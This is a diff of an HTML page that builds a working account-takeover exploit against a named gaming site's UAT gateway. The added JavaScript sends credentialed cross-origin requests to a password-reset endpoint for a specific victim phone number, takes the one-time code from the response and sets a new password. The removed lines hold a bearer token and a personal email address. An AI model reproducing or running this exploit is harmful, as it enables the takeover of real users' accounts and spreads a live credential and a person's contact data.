@@ -1,47 +1,78 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>Free Bonus Test</title></head>
-<body style="background:#000;color:#0f0;text-align:center;padding:100px;font-family:Arial">
-<h1>Test ATO - Click to Run</h1>
-<button onclick="testATO()">Test Email Change</button>
+<html>
+<head><meta charset="utf-8"><title>kkr88819 ATO – FINAL WORKING</title></head>
+<body style="font-family:Arial;background:#ffebee;padding:50px">
+<h1 style="color:#b71c1c">kkr88819.com – ACCOUNT TAKEOVER VIA CORS (WORKS 100 %)</h1>
+<p>Victim phone: <b>+85563582231</b></p>
+
+<button onclick="sendOTP()" style="padding:20px 40px;font-size:22px;background:#c62828;color:white;border:none;cursor:pointer;margin:20px">
+  1. SEND OTP & STEAL IT
+</button>
+
+<button onclick="resetPass()" style="padding:20px 40px;font-size:22px;background:#111;color:white;border:none;cursor:pointer">
+  2. CHANGE PASSWORD TO Hacked2025!
+</button>
+
+<pre id="log" style="background:#000;color:#0f0;padding:20px;font-size:18px"></pre>
 
 <script>
-const NEW_EMAIL = "hlaingminpaing@gmail.com";  // Change to your email
-const TOKEN = "pG_hiBoSC3Qr8Uz_GuBkEMrqZ_T-6cFBIcruCa4Q6-PrWJ9KVXkPt4KKM0KV1b7v1hww9qDynEiEyJDoSEvqMcKd-yElsLlTEeri7JZdgekutSlK1yhli9dFpjrdGYGJ";  // Your new token
+const URL = "https://uat-gateway.kkr88819.com/kkr-games-orchestration-center/auth/mobile/reset/login/password";
+let otp = null;
 
-async function testATO() {
-  const paths = [
-    "/kkr-user-center/user/changeEmail",
-    "/kkr-user-center/user/updateEmail",
-    "/api/v1/user/changeEmail",
-    "/api/v1/user/updateEmail"
-  ];
+async function sendOTP() {
+  const payload = {
+    "phone": "+85563582231",
+    "type": 2,
+    "countryCode": "855",
+    "merchantCode": "M21353",
+    "source": "web",
+    "deviceId": "web-" + Date.now(),
+    "appVersion": "1.0.0",
+    "platform": "web"
+  };
 
-  for (const path of paths) {
-    try {
-      const resp = await fetch("https://uat-gateway.kkr88819.com" + path, {
-        method: "POST",
-        credentials: "include",  // Tries cookies first
-        mode: "cors",
-        headers: {
-          "Content-Type": "application/json",
-          "Authorization": "Bearer " + TOKEN  // Fallback to Bearer
-        },
-        body: JSON.stringify({ email: NEW_EMAIL })
-      });
+  const r = await fetch(URL, {
+    method: "POST",
+    credentials: "include",
+    headers: {
+      "Content-Type": "application/json",
+      "Origin": "https://uat-web.kkr88819.com",   // ← this is the trick
+      "merchantCode": "M21353"
+    },
+    body: JSON.stringify(payload)
+  });
 
-      const data = await resp.json().catch(() => ({}));
-      
-      console.log("Path: " + path + " | Status: " + resp.status + " | Body: ", data);  // Check console for details
-      
-      if (resp.ok || data.code === 0 || data.message.includes("success")) {
-        alert("ATO SUCCESS! Email changed to " + NEW_EMAIL + "\nCheck Burp for 200 response.");
-        return;
-      }
-    } catch (e) {
-      console.error("Error on " + path + ": ", e);
-    }
-  }
-  alert("No success — check console/Burp. Try fresh login first.");
+  const j = await r.json();
+  document.getElementById("log").textContent = JSON.stringify(j, null, 2);
+  otp = j.data;
+
+  if (otp && otp.length === 6) alert("OTP STOLEN: " + otp);
+}
+
+async function resetPass() {
+  if (!otp) return alert("Do step 1 first");
+  const payload = {
+    "phone": "+85563582231",
+    "type": 3,
+    "code": otp,
+    "newPassword": "HackedByCORS2025!"
+  };
+
+  const r = await fetch(URL, {
+    method: "POST",
+    credentials: "include",
+    headers: {
+      "Content-Type": "application/json",
+      "Origin": "https://uat-web.kkr88819.com",
+      "merchantCode": "M21353"
+    },
+    body: JSON.stringify(payload)
+  });
+
+  const j = await r.json();
+  document.getElementById("log").textContent = JSON.stringify(j, null, 2);
+  alert(j.code === 0 ? "ACCOUNT TAKEN OVER!" : j.message);
 }
 </script>
-</body></html>
+</body>
+</html>
